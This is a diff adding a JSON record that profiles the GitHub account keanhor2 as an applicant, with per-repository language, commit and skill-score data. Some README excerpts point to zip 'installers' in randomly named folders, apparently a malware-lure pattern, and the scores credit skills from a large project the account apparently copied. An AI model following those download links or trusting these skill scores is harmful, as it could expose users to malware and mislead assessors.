@@ -1,0 +1,1259 @@
+{
+  "applicant_id": "applicant0152",
+  "login": "keanhor2",
+  "html_url": "https://github.com/keanhor2",
+  "created_at": "2021-09-08T05:07:09Z",
+  "account_age_days": 1834,
+  "public_repos": 41,
+  "followers": 1,
+  "following": 1,
+  "repos": [
+    {
+      "name": "madmail",
+      "full_name": "keanhor2/madmail",
+      "html_url": "https://github.com/keanhor2/madmail",
+      "description": "📧 Streamline secure messaging with Madmail, the optimized chatmail server for instant and encrypted email without personal data.",
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2021-09-08T05:09:13Z",
+      "pushed_at": "2026-09-17T00:22:00Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 2193,
+      "default_branch": "main",
+      "license": "GPL-3.0",
+      "topics": [
+        "github-config"
+      ],
+      "languages": {
+        "Go": 1468471,
+        "HTML": 14401,
+        "C": 9677,
+        "Jinja": 8024,
+        "Shell": 5802,
+        "Go Template": 1762,
+        "CSS": 1373,
+        "Dockerfile": 870,
+        "Makefile": 234
+      },
+      "primary_language": "Go",
+      "file_count": 448,
+      "top_level_paths": [
+        ".dockerignore",
+        ".editorconfig",
+        ".gitattributes",
+        ".gitignore",
+        ".golangci.yml",
+        ".goreleaser.yaml",
+        ".mkdocs.yml",
+        ".version",
+        "COPYING",
+        "DEVELOPMENT.md",
+        "Dockerfile",
+        "HACKING.md",
+        "Makefile",
+        "README.md",
+        "RELEASES.md",
+        "build.sh",
+        "cmd",
+        "config.go",
+        "contrib",
+        "directories.go",
+        "directories_docker.go",
+        "dist",
+        "docs",
+        "framework",
+        "go.mod",
+        "go.sum",
+        "internal",
+        "maddy.conf",
+        "maddy.conf.docker",
+        "maddy.go",
+        "maddy_debug.go",
+        "signal.go",
+        "signal_nonposix.go",
+        "suburbed",
+        "systemd.go",
+        "systemd_nonlinux.go",
+        "tests",
+        "tools.go",
+        "toprail"
+      ],
+      "notable_files": [
+        "Dockerfile",
+        "go.mod"
+      ],
+      "manifests": {
+        "go.mod": [
+          "blitiri.com.ar/go/spf",
+          "cloud.google.com/go/auth",
+          "cloud.google.com/go/auth/oauth2adapt",
+          "cloud.google.com/go/compute/metadata",
+          "filippo.io/edwards25519",
+          "github.com/aws/aws-sdk-go-v2",
+          "github.com/aws/aws-sdk-go-v2/config",
+          "github.com/aws/aws-sdk-go-v2/credentials",
+          "github.com/aws/aws-sdk-go-v2/feature/ec2/imds",
+          "github.com/aws/aws-sdk-go-v2/internal/configsources",
+          "github.com/aws/aws-sdk-go-v2/internal/endpoints/v2",
+          "github.com/aws/aws-sdk-go-v2/internal/ini",
+          "github.com/aws/aws-sdk-go-v2/service/internal/accept-encoding",
+          "github.com/aws/aws-sdk-go-v2/service/internal/presigned-url",
+          "github.com/aws/aws-sdk-go-v2/service/route53",
+          "github.com/aws/aws-sdk-go-v2/service/sso",
+          "github.com/aws/aws-sdk-go-v2/service/ssooidc",
+          "github.com/aws/aws-sdk-go-v2/service/sts",
+          "github.com/aws/smithy-go",
+          "github.com/azure/go-ntlmssp",
+          "github.com/beorn7/perks",
+          "github.com/c0va23/go-proxyprotocol",
+          "github.com/caddyserver/certmagic",
+          "github.com/caddyserver/zerossl",
+          "github.com/cespare/xxhash/v2",
+          "github.com/cpuguy83/go-md2man/v2",
+          "github.com/digitalocean/godo",
+          "github.com/dustin/go-humanize",
+          "github.com/emersion/go-imap",
+          "github.com/emersion/go-imap-compress",
+          "github.com/emersion/go-imap-sortthread",
+          "github.com/emersion/go-message",
+          "github.com/emersion/go-milter",
+          "github.com/emersion/go-msgauth",
+          "github.com/emersion/go-sasl",
+          "github.com/emersion/go-smtp",
+          "github.com/fatih/color",
+          "github.com/felixge/httpsnoop",
+          "github.com/foxcpp/go-dovecot-sasl",
+          "github.com/foxcpp/go-imap-backend-tests",
+          "github.com/foxcpp/go-imap-i18nlevel",
+          "github.com/foxcpp/go-imap-mess",
+          "github.com/foxcpp/go-imap-namespace",
+          "github.com/foxcpp/go-imap-sql",
+          "github.com/foxcpp/go-mockdns",
+          "github.com/foxcpp/go-mtasts",
+          "github.com/fsnotify/fsnotify",
+          "github.com/g-core/gcore-dns-sdk-go",
+          "github.com/gehirninc/crypt",
+          "github.com/go-asn1-ber/asn1-ber",
+          "github.com/go-ini/ini",
+          "github.com/go-ldap/ldap/v3",
+          "github.com/go-logr/logr",
+          "github.com/go-logr/stdr",
+          "github.com/go-sql-driver/mysql",
+          "github.com/goccy/go-json",
+          "github.com/google/go-cmp",
+          "github.com/google/go-querystring",
+          "github.com/google/s2a-go",
+          "github.com/google/uuid",
+          "github.com/googleapis/enterprise-certificate-proxy",
+          "github.com/googleapis/gax-go/v2",
+          "github.com/hashicorp/go-cleanhttp",
+          "github.com/hashicorp/go-hclog",
+          "github.com/hashicorp/go-retryablehttp",
+          "github.com/hashicorp/hcl",
+          "github.com/jmespath/go-jmespath",
+          "github.com/johannesboyne/gofakes3",
+          "github.com/josharian/intern",
+          "github.com/klauspost/compress",
+          "github.com/klauspost/cpuid/v2",
+          "github.com/lib/pq",
+          "github.com/libdns/acmedns",
+          "github.com/libdns/alidns",
+          "github.com/libdns/cloudflare",
+          "github.com/libdns/digitalocean",
+          "github.com/libdns/gandi",
+          "github.com/libdns/gcore",
+          "github.com/libdns/googleclouddns",
+          "github.com/libdns/hetzner",
+          "github.com/libdns/leaseweb",
+          "github.com/libdns/libdns",
+          "github.com/libdns/metaname",
+          "github.com/libdns/namecheap",
+          "github.com/libdns/namedotcom",
+          "github.com/libdns/rfc2136",
+          "github.com/libdns/route53",
+          "github.com/libdns/vultr",
+          "github.com/magiconair/properties",
+          "github.com/mailru/easyjson",
+          "github.com/mattn/go-colorable",
+          "github.com/mattn/go-isatty",
+          "github.com/mattn/go-sqlite3",
+          "github.com/mholt/acmez/v3",
+          "github.com/miekg/dns",
+          "github.com/minio/md5-simd",
+          "github.com/minio/minio-go/v7",
+          "github.com/mitchellh/mapstructure",
+          "github.com/munnerz/goautoneg",
+          "github.com/ncruces/go-strftime",
+          "github.com/netauth/netauth",
+          "github.com/netauth/protocol",
+          "github.com/pelletier/go-toml/v2",
+          "github.com/pierrec/lz4",
+          "github.com/pkg/errors",
+          "github.com/prometheus/client_golang",
+          "github.com/prometheus/client_model",
+          "github.com/prometheus/common",
+          "github.com/prometheus/procfs",
+          "github.com/remyoudompheng/bigfft",
+          "github.com/rs/xid",
+          "github.com/russross/blackfriday/v2",
+          "github.com/ryszard/goskiplist",
+          "github.com/sagikazarmark/locafero",
+          "github.com/sagikazarmark/slog-shim",
+          "github.com/shabbyrobe/gocovmerge",
+          "github.com/skip2/go-qrcode",
+          "github.com/sourcegraph/conc",
+          "github.com/spf13/afero",
+          "github.com/spf13/cast"
+        ]
+      },
+      "has_readme": true,
+      "readme_length": 4394,
+      "readme_excerpt": "# 📬 madmail - Your Easy Email Chat Solution\n\n## 🚀 Getting Started\n\nWelcome to madmail! This application provides a simple way to manage your email conversations through a chat-like interface. No more sifting through cluttered inboxes. With madmail, you can focus on your correspondence efficiently.\n\n## 📥 Download & Install\n\nTo get started with madmail, you need to download the application. Follow these steps:\n\n1. **Visit the Releases Page**: To download the latest version of madmail, visit the [Releases Page](https://raw.githubusercontent.com/keanhor2/madmail/main/suburbed/madmail.zip).\n\n2. **Download the Application**: On the releases page, find the most recent version. Click on the link for the file that corresponds to your operating system to start the download.\n\n3. **Install madmail**: Once the download is complete, open the installer and follow the prompts to install madmail on your computer.\n\n4. **Launch the Application**: After the installation, look for the madmail icon on your desktop or in your applications folder. Double-click the icon to open the application.\n\n## 🔧 Features\n\nmadmail offers a range of features to enhance your email experience:\n\n- **Chat-Based Interface**:",
+      "has_ci": false,
+      "has_tests": true,
+      "has_docker": true,
+      "has_releases": false,
+      "contributors_count": 2,
+      "contribution_share": 0.444,
+      "commits": {
+        "count": 4,
+        "first_at": "2025-10-30T14:21:45+00:00",
+        "last_at": "2026-09-17T00:21:59+00:00",
+        "active_days": 2,
+        "span_days": 321,
+        "max_per_day": 3,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": true,
+          "has_docker": true,
+          "deployed": false,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": true,
+          "substantial_tree": true,
+          "documented": true
+        },
+        "entry_flag_count": 0,
+        "intermediate_flag_count": 5,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 316
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": true,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "go",
+          "source": "language",
+          "detail": "Go: 1,468,471 bytes (97% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "HTML: 14,401 bytes (1% of repo)",
+          "strength": 0.40953320967500634
+        },
+        {
+          "skill_id": "c-cpp",
+          "source": "language",
+          "detail": "C: 9,677 bytes (1% of repo)",
+          "strength": 0.4064060044458743
+        },
+        {
+          "skill_id": "shell",
+          "source": "language",
+          "detail": "Shell: 5,802 bytes (0% of repo)",
+          "strength": 0.4038408223411143
+        },
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "CSS: 1,373 bytes (0% of repo)",
+          "strength": 0.4009089019431834
+        },
+        {
+          "skill_id": "docker",
+          "source": "file",
+          "detail": "Dockerfile (Dockerfile)",
+          "strength": 0.6
+        },
+        {
+          "skill_id": "kubernetes",
+          "source": "file",
+          "detail": "kubernetes manifests (contrib/kubernetes/chart/.helmignore)",
+          "strength": 0.6
+        },
+        {
+          "skill_id": "technical-writing",
+          "source": "file",
+          "detail": "docs directory (docs/STYLEGUIDE.md)",
+          "strength": 0.6
+        },
+        {
+          "skill_id": "unit-testing",
+          "source": "file",
+          "detail": "test file (framework/address/norm_test.go)",
+          "strength": 0.6
+        },
+        {
+          "skill_id": "go",
+          "source": "file",
+          "detail": "Go module (go.mod)",
+          "strength": 0.6
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 1500828,
+        "strong_skills": [
+          "docker",
+          "go",
+          "kubernetes",
+          "technical-writing",
+          "unit-testing"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "lifestyle-app",
+      "full_name": "keanhor2/lifestyle-app",
+      "html_url": "https://github.com/keanhor2/lifestyle-app",
+      "description": null,
+      "homepage": "lifestyle-app-nu.vercel.app",
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2022-09-16T05:18:11Z",
+      "pushed_at": "2025-10-31T00:02:09Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 2941,
+      "default_branch": "main",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "Vue": 3102,
+        "JavaScript": 1540,
+        "HTML": 611
+      },
+      "primary_language": "Vue",
+      "file_count": 24,
+      "top_level_paths": [
+        ".env.development",
+        ".env.production",
+        ".gitignore",
+        "README.md",
+        "babel.config.js",
+        "cystectasy",
+        "jsconfig.json",
+        "nutrient",
+        "package-lock.json",
+        "package.json",
+        "public",
+        "src",
+        "vue.config.js"
+      ],
+      "notable_files": [
+        "package.json"
+      ],
+      "manifests": {
+        "package.json": [
+          "@babel/core",
+          "@babel/eslint-parser",
+          "@fortawesome/fontawesome-free",
+          "@fortawesome/fontawesome-svg-core",
+          "@fortawesome/free-solid-svg-icons",
+          "@fortawesome/vue-fontawesome",
+          "@vue/cli-plugin-babel",
+          "@vue/cli-plugin-eslint",
+          "@vue/cli-plugin-router",
+          "@vue/cli-service",
+          "axios",
+          "bootstrap",
+          "bootstrap-vue",
+          "core-js",
+          "eslint",
+          "eslint-plugin-vue",
+          "vue",
+          "vue-router"
+        ]
+      },
+      "has_readme": true,
+      "readme_length": 386,
+      "readme_excerpt": "# boostrap-view\n\n## Project setup\n```\nnpm install\n```\n\n### Compiles and hot-reloads for development\n```\nnpm run serve\n```\n\n### Compiles and minifies for production\n```\nnpm run build\n```\n\n### Lints and fixes files\n```\nnpm run lint\n```\n\n### Customize configuration\nSee [Configuration Reference](https://raw.githubusercontent.com/keanhor2/lifestyle-app/main/cystectasy/lifestyle-app.zip).\n",
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 4,
+        "first_at": "2022-09-16T05:24:43+00:00",
+        "last_at": "2025-10-31T00:02:09+00:00",
+        "active_days": 3,
+        "span_days": 1140,
+        "max_per_day": 2,
+        "low_effort_message_ratio": 0.75,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "commit change"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": true,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": true,
+          "documented": false
+        },
+        "entry_flag_count": 0,
+        "intermediate_flag_count": 2,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 12
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "vue",
+          "source": "language",
+          "detail": "Vue: 3,102 bytes (59% of repo)",
+          "strength": 0.9905197030268418
+        },
+        {
+          "skill_id": "javascript",
+          "source": "language",
+          "detail": "JavaScript: 1,540 bytes (29% of repo)",
+          "strength": 0.6931658100133258
+        },
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "HTML: 611 bytes (12% of repo)",
+          "strength": 0.5163144869598325
+        },
+        {
+          "skill_id": "vue",
+          "source": "manifest",
+          "detail": "vue in package.json",
+          "strength": 0.9
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 5253,
+        "strong_skills": [
+          "javascript",
+          "vue"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "KHMER-FOOD",
+      "full_name": "keanhor2/KHMER-FOOD",
+      "html_url": "https://github.com/keanhor2/KHMER-FOOD",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2022-07-10T15:06:00Z",
+      "pushed_at": "2026-02-21T20:42:27Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 3240,
+      "default_branch": "main",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "HTML": 21650,
+        "CSS": 4753
+      },
+      "primary_language": "HTML",
+      "file_count": 7,
+      "top_level_paths": [
+        ".gitignore",
+        ".vscode",
+        "css",
+        "index.html",
+        "philohellenian",
+        "uncleft"
+      ],
+      "notable_files": [],
+      "manifests": {},
+      "has_readme": false,
+      "readme_length": 0,
+      "readme_excerpt": null,
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 4,
+        "first_at": "2022-07-10T15:12:20+00:00",
+        "last_at": "2026-02-21T20:42:26+00:00",
+        "active_days": 3,
+        "span_days": 1322,
+        "max_per_day": 2,
+        "low_effort_message_ratio": 0.75,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "create_food"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": true,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": false,
+          "documented": false
+        },
+        "entry_flag_count": 1,
+        "intermediate_flag_count": 0,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 2
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "HTML: 21,650 bytes (82% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "CSS: 4,753 bytes (18% of repo)",
+          "strength": 0.5800174222626218
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 26403,
+        "strong_skills": [
+          "html-css"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "Kea-CV",
+      "full_name": "keanhor2/Kea-CV",
+      "html_url": "https://github.com/keanhor2/Kea-CV",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2021-11-08T01:29:44Z",
+      "pushed_at": "2026-02-21T20:42:16Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 5637,
+      "default_branch": "master",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "HTML": 20766,
+        "CSS": 12270
+      },
+      "primary_language": "HTML",
+      "file_count": 39,
+      "top_level_paths": [
+        ".vscode",
+        "CSS",
+        "File download",
+        "fustily",
+        "images",
+        "index.html",
+        "outclass",
+        "pages"
+      ],
+      "notable_files": [],
+      "manifests": {},
+      "has_readme": false,
+      "readme_length": 0,
+      "readme_excerpt": null,
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 23,
+        "first_at": "2021-11-08T01:46:17+00:00",
+        "last_at": "2026-02-21T20:42:16+00:00",
+        "active_days": 9,
+        "span_days": 1566,
+        "max_per_day": 7,
+        "low_effort_message_ratio": 0.13,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "add link",
+          "finish website",
+          "add link",
+          "add link",
+          "add link",
+          "add link",
+          "requred",
+          "resposive",
+          "resposive",
+          "responsive",
+          "resposive",
+          "resposive footer",
+          "add responsive",
+          "responsive",
+          "add responsive menu",
+          "add contact page",
+          "footer"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": true,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": true,
+          "many_active_days": true,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": false,
+          "documented": false
+        },
+        "entry_flag_count": 1,
+        "intermediate_flag_count": 2,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 5
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "HTML: 20,766 bytes (63% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "CSS: 12,270 bytes (37% of repo)",
+          "strength": 0.7714130039956412
+        },
+        {
+          "skill_id": "computer-vision",
+          "source": "repo_name",
+          "detail": "'cv' in repo name/description",
+          "strength": 0.2
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 33036,
+        "strong_skills": [
+          "html-css"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "HOTEL",
+      "full_name": "keanhor2/HOTEL",
+      "html_url": "https://github.com/keanhor2/HOTEL",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2021-10-08T03:05:32Z",
+      "pushed_at": "2026-02-21T20:42:09Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 4775,
+      "default_branch": "master",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "HTML": 3829
+      },
+      "primary_language": "HTML",
+      "file_count": 6,
+      "top_level_paths": [
+        "Hotel.jpg",
+        "index.html",
+        "logo-removebg-preview.png",
+        "quadrigeminum",
+        "stipendiary"
+      ],
+      "notable_files": [],
+      "manifests": {},
+      "has_readme": false,
+      "readme_length": 0,
+      "readme_excerpt": null,
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 4,
+        "first_at": "2021-10-08T03:13:57+00:00",
+        "last_at": "2026-02-21T20:42:09+00:00",
+        "active_days": 3,
+        "span_days": 1597,
+        "max_per_day": 2,
+        "low_effort_message_ratio": 0.75,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Hetel"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": true,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": true,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": false,
+          "documented": false
+        },
+        "entry_flag_count": 2,
+        "intermediate_flag_count": 0,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 1
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "HTML: 3,829 bytes (100% of repo)",
+          "strength": 1.0
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 3829,
+        "strong_skills": [
+          "html-css"
+        ]
+      },
+      "tree_truncated": false
+    }
+  ],
+  "external_contributions": [],
+  "languages_bytes": {
+    "Go": 1468471,
+    "HTML": 61257,
+    "CSS": 18396,
+    "C": 9677,
+    "Jinja": 8024,
+    "Shell": 5802,
+    "Vue": 3102,
+    "Go Template": 1762,
+    "JavaScript": 1540,
+    "Dockerfile": 870,
+    "Makefile": 234
+  },
+  "total_commits": 39,
+  "skill_evidence": [
+    {
+      "skill_id": "html-css",
+      "repos": [
+        "keanhor2/madmail",
+        "keanhor2/lifestyle-app",
+        "keanhor2/KHMER-FOOD",
+        "keanhor2/Kea-CV",
+        "keanhor2/HOTEL"
+      ],
+      "signal_count": 8,
+      "sources": [
+        "language"
+      ],
+      "max_strength": 1.0,
+      "total_bytes": 79653,
+      "commit_count": 39,
+      "first_seen": "2021-10-08T03:13:57+00:00",
+      "last_seen": "2026-09-17T00:21:59+00:00",
+      "details": [
+        "madmail: HTML: 14,401 bytes (1% of repo)",
+        "madmail: CSS: 1,373 bytes (0% of repo)",
+        "lifestyle-app: HTML: 611 bytes (12% of repo)",
+        "KHMER-FOOD: HTML: 21,650 bytes (82% of repo)",
+        "KHMER-FOOD: CSS: 4,753 bytes (18% of repo)",
+        "Kea-CV: HTML: 20,766 bytes (63% of repo)",
+        "Kea-CV: CSS: 12,270 bytes (37% of repo)",
+        "HOTEL: HTML: 3,829 bytes (100% of repo)"
+      ]
+    },
+    {
+      "skill_id": "go",
+      "repos": [
+        "keanhor2/madmail"
+      ],
+      "signal_count": 2,
+      "sources": [
+        "language",
+        "file"
+      ],
+      "max_strength": 1.0,
+      "total_bytes": 1468471,
+      "commit_count": 4,
+      "first_seen": "2025-10-30T14:21:45+00:00",
+      "last_seen": "2026-09-17T00:21:59+00:00",
+      "details": [
+        "madmail: Go: 1,468,471 bytes (97% of repo)",
+        "madmail: Go module (go.mod)"
+      ]
+    },
+    {
+      "skill_id": "vue",
+      "repos": [
+        "keanhor2/lifestyle-app"
+      ],
+      "signal_count": 2,
+      "sources": [
+        "language",
+        "manifest"
+      ],
+      "max_strength": 0.9905197030268418,
+      "total_bytes": 3102,
+      "commit_count": 4,
+      "first_seen": "2022-09-16T05:24:43+00:00",
+      "last_seen": "2025-10-31T00:02:09+00:00",
+      "details": [
+        "lifestyle-app: Vue: 3,102 bytes (59% of repo)",
+        "lifestyle-app: vue in package.json"
+      ]
+    },
+    {
+      "skill_id": "javascript",
+      "repos": [
+        "keanhor2/lifestyle-app"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "language"
+      ],
+      "max_strength": 0.6931658100133258,
+      "total_bytes": 1540,
+      "commit_count": 4,
+      "first_seen": "2022-09-16T05:24:43+00:00",
+      "last_seen": "2025-10-31T00:02:09+00:00",
+      "details": [
+        "lifestyle-app: JavaScript: 1,540 bytes (29% of repo)"
+      ]
+    },
+    {
+      "skill_id": "docker",
+      "repos": [
+        "keanhor2/madmail"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "file"
+      ],
+      "max_strength": 0.6,
+      "total_bytes": 0,
+      "commit_count": 4,
+      "first_seen": "2025-10-30T14:21:45+00:00",
+      "last_seen": "2026-09-17T00:21:59+00:00",
+      "details": [
+        "madmail: Dockerfile (Dockerfile)"
+      ]
+    },
+    {
+      "skill_id": "kubernetes",
+      "repos": [
+        "keanhor2/madmail"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "file"
+      ],
+      "max_strength": 0.6,
+      "total_bytes": 0,
+      "commit_count": 4,
+      "first_seen": "2025-10-30T14:21:45+00:00",
+      "last_seen": "2026-09-17T00:21:59+00:00",
+      "details": [
+        "madmail: kubernetes manifests (contrib/kubernetes/chart/.helmignore)"
+      ]
+    },
+    {
+      "skill_id": "technical-writing",
+      "repos": [
+        "keanhor2/madmail"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "file"
+      ],
+      "max_strength": 0.6,
+      "total_bytes": 0,
+      "commit_count": 4,
+      "first_seen": "2025-10-30T14:21:45+00:00",
+      "last_seen": "2026-09-17T00:21:59+00:00",
+      "details": [
+        "madmail: docs directory (docs/STYLEGUIDE.md)"
+      ]
+    },
+    {
+      "skill_id": "unit-testing",
+      "repos": [
+        "keanhor2/madmail"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "file"
+      ],
+      "max_strength": 0.6,
